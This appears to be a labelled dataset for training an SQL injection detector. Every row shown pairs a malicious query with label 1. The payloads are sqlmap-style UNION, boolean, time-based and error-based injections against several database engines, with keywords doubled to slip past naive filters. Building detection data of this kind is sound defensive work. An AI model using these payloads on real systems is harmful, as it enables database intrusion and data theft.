Query,Label
"1' union all selselectect nulnulll,nulnulll,nulnulll--",1
1 whewherere 9872  =  9872,1
"-7482%""   )    )    oorr 1570  =  convert  (  iinnt,  (  seleselectct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (   ""%""  =  """,1
"1'  )   whewherere 7587  =  7587 oorr 8421  =    (  sselectelect count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
"-9295   )    )     )   oorr 1570  =  convert  (  iinnt,  (  seleselectct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd    (    (     (  8752  =  8752",1
"1'  )   as ibqr wherwheree 5372  =  5372 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-9135""   )    )    oorr 6872  =  6872 aandnd    (    (   ""fllx""  =  ""fllx",1
1%' anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd '%'  =  ',1
"1%' oorr 7552  =    (  seleselectct count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd '%'  =  '",1
"1,  (  seleselectct   (  case when   (  3888  =  3888  )   then   (  seleselectct count  (  *  )   frfromom generate_series  (  1,5000000   )    )    else 1/  (  seleselectct 0  )   end   )    )   ",1
"-9881""   )    )    oorr 9850  =  8118#",1
"1  )   union all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"-4817 union all sselectelect 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
seleselectct   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  seleselectct 5390 frfromom mysql.db  )   end  )  #,1
-7111' oorr   (  8459  =  8459  )  *4906,1
"1 union all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
-7859  )   as ipdg wwherehere 4413  =  4413 oorr 9323  =  9323#,1
"-2323""  )   as zgsn wwherehere 9274  =  9274 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
1  )   wwherehere 5774  =  5774,1
"1""   )    )    as fhlg wherwheree 1004  =  1004 anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"-8893%'   )    )    oorr elt  (  1032  =  1032,3623  )   aandnd    (    (   '%'  =  '",1
"-8791""   )    )     )   oorr make_sesett  (  6681  =  6620,6620  )   aandnd    (    (     (  ""pvdk""  =  ""pvdk",1
"-3081""   )    )     )   oorr 3736  =  1899",1
-4082   )    )    oorr 5903  =    (  'qqpjq'||  (  selecselectt case 5903 when 5903 then 1 else 0 end frfromom rdb$datdatabaseabase  )  ||'qzvzq'  )   anandd    (    (   7874  =  7874,1
selselectect   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  selselectect 6615 frofromm master..sysdadatabasetabases  )   end  )  --,1
-7648'  )   oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
seselectlect   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  seselectlect 9540 frofromm iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
seselectlect case when 7426  =  6635 then 1 else nnullull end--,1
"1%'   )    )     )   union all selecselectt nnullull,nnullull,nnullull,nnullull#",1
"iif  (  3204  =  8489,3204,1/0  )  ",1
"1%'  )    (  seselectlect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   ffromrom   (  vvaluesalues  (  0   )    )     )   aandnd   (  '%'  =  '",1
"1""   )    )    anandd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1""   )    )     )    (  seselectlect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frfromom iinnfoorrmation_schema.system_users  )   aandnd    (    (     (  ""wjhj""  =  ""wjhj",1
"1"" wwherehere 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"-3933'   )    )     )   union all selecselectt 6198,6198,6198,6198,6198#",1
"1%""   )    )    aandnd 6240  =    (  'qqpjq'||  (  seleselectct case 6240 when 6240 then 1 else 0 end ffromrom rdb$databdatabasease  )  ||'qzvzq'  )   aandnd    (    (   ""%""  =  """,1
"1"" aandnd updaupdatetexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selselectect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   aandnd ""egzm""  =  ""egzm",1
"-3361   )    )    union all selselectect 2827,2827,2827,2827#",1
1' anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd 'iuao'  =  'iuao,1
"selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000  )  #",1
" end anandd    (    (   ""%""  =  """,1
"1""   )    )    as bbkl whewherere 5686  =  5686",1
"1%""  )   aandnd   (  3020  =  3020  )  *6703 aandnd   (  ""%""  =  """,1
1'+  (  selecselectt 'cwta' whwhereere 6091  =  6091,1
"1%""   )    )    aandnd elt  (  4249  =  4249,7259  )   aandnd    (    (   ""%""  =  """,1
"-6333""   )    )     )   union all selecselectt 9851,9851,9851,9851,9851,9851--",1
"1""   )    )    aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (   ""xccy""  =  ""xccy",1
"1""  )   as xioc whwhereere 7260  =  7260 oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-2298%' oorr 1 group bbyy concat  (  0x7171706a71,  (  seselectlect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"-1808%""   )    )    oorr 4595  =  3545 anandd    (    (   ""%""  =  """,1
1  )   as bhdj wwherehere 4472  =  4472,1
"1%"" union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"selselectect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1
"-7635"" union all sselectelect 1284,1284,1284,1284,1284,1284#",1
1'   )    )    as pgif whwhereere 6346  =  6346,1
"1""  )   as yekp wherwheree 3049  =  3049 aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )  --",1
"1""   )    )    as mvxa whwhereere 3024  =  3024",1
"1""  )   rlilikeke   (  sselectelect * frofromm   (  sselectelect  (  sleep  (  5   )    )     )  sgvo  )   aandnd   (  ""cneo"" lilikeke ""cneo",1
"1%""  )   rlilikeke sleep  (  5  )   anandd   (  ""%""  =  """,1
"1'  )   anandd   (  seleselectct 2*  (  if   (    (   seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   as knxr whewherere 5662  =  5662 union all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
-6045 oorr 8919  =  2827--,1
"1%"" oorr 9643  =    (  selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )   aandnd ""%""  =  """,1
"1""   )    )    as khqq whwhereere 3637  =  3637 aandnd 8407  =    (  seselectlect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"1'  )   as xvcr whwhereere 6456  =  6456 anandd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
"-3349   )    )     )   union all seselectlect 6553,6553#",1
"-3475"" oorr elt  (  5532  =  4242,4242  )  ",1
seselectlect   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  seselectlect 2774 frfromom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"1'   )    )    aandnd 8189  =    (  sselectelect count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  --",1
"1   )    )    as ambt whewherere 5198  =  5198 aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
-7505'   )    )    as lqvw whwhereere 8565  =  8565 oorr 6872  =  6872--,1
" end aandnd   (  ""xksk""  =  ""xksk",1
"-3513%"" union all seleselectct 8473,8473#",1
"selecselectt benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd   (  '%'  =  '",1
"1'  )   anandd elt  (  3528  =  3566,3566  )  ",1
1  )   anandd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"1'   )    )     )   anandd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1 aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",1
"1'   )    )     )   aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (     (  'abcf' lilikeke 'abcf",1
"1' iinn boolean mode  )   union all selselectect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
selselectect   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as iinnt  )  /  (  selselectect 0 ffromrom dual  )   end  )   ffromrom dual--,1
"-9286""   )    )    as mfxl wherwheree 9348  =  9348 union all sselectelect 9348#",1
"1%""   )    )    union all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
1'  )   anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  'lnte'  =  'lnte,1
"1'   )    )    union all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"-8636""   )    )     )   union all sselectelect 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1
"-6940'  )   union all selecselectt 3042,3042,3042,3042,3042#",1
"1""  )   as rnjx whewherere 2679  =  2679 anandd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1  )   as qgsb wwherehere 7600  =  7600 anandd 2006  =  2006,1
1' wwherehere 4795  =  4795 anandd 4595  =  4595#,1
"1""  )   as rnte wherwheree 6517  =  6517 anandd 9254  =    (  seleselectct count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1"" anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selselectect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1
"1  )   as ghew wwherehere 6441  =  6441 union all seleselectct nunullll,nunullll--",1
"-2548""   )    )     )   oorr 5107  =  8049--",1
1' ooorrderrder bbyy 1#,1
"1""  )   wwherehere 2834  =  2834   (  seselectlect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   ffromrom iinnfoorrmation_schema.system_users  )  --",1
"-1963 union all seleselectct 6831,6831,6831,6831,6831,6831,6831,6831#",1
"1"" oorr   (  sselectelect * frfromom   (  sselectelect  (  sleep  (  5   )    )     )  ydpu  )   aandnd ""pxix""  =  ""pxix",1
"1%' aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
"1'   )    )     )   aandnd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   aandnd    (    (     (  'xngr'  =  'xngr",1
"-6514   )    )    as pbgg wherwheree 6841  =  6841 union all sselectelect 6841,6841,6841,6841--",1
"1"" anandd 6969  =    (  sselectelect 6969 frfromom pg_sleep  (  5   )    )    anandd ""twmy""  =  ""twmy",1
selselectect case when 6420  =  7941 then 1 else nulnulll end--,1
"1""   )    )    as qvyu wherwheree 5962  =  5962 oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selselectect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
1'  )   aandnd 4595  =  4595#,1
"1'||  (  seselectlect 'ersu' wwherehere 4123  =  4123 anandd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%' oorr 4915  =    (  seleselectct count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  --",1
"seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 aandnd    (    (     (  5432  =  5432",1
"1""   )    )    anandd 4241  =  convert  (  iinnt,  (  selecselectt char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd    (    (   ""bxcb"" llikeike ""bxcb",1
"1'+  (  seleselectct 'iyvn' wherwheree 9358  =  9358 oorr elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",1
"1'   )    )    oorr 8421  =    (  selselectect count  (  *  )   frofromm generate_series  (  1,5000000   )    )    aandnd    (    (   'qgov'  =  'qgov",1
"1,exp  (  ~  (  selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1"" whwhereere 8727  =  8727",1
selselectect sleep  (  5  )   anandd    (    (   'mmvf' liklikee 'mmvf,1
"1'||  (  seleselectct 'jpso' frfromom dual whwhereere 9357  =  9357 oorr   (  seleselectct 2*  (  if   (    (   seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
-6222   )    )    oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd    (    (   3230  =  3230,1
"-4056""   )    )     )   union all selselectect 4363,4363,4363,4363,4363,4363,4363,4363#",1
"-5207"" whewherere 2050  =  2050 union all selecselectt 2050,2050,2050,2050,2050,2050,2050--",1
"1"" whwhereere 4345  =  4345 aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"1'   )    )     )   anandd 5556  =    (  selecselectt count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd    (    (     (  'dhqz'  =  'dhqz",1
"1""  )    (  seleselectct   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frofromm iinnfoorrmation_schema.system_users  )   anandd   (  ""mrsl""  =  ""mrsl",1
"-1339   )    )     )   union all sselectelect 2938,2938,2938,2938,2938,2938#",1
"-9384%"" union all selselectect 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
-8007'   )    )    as bgpp whewherere 9555  =  9555 oorr 4144  =    (  seleselectct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  )  --,1
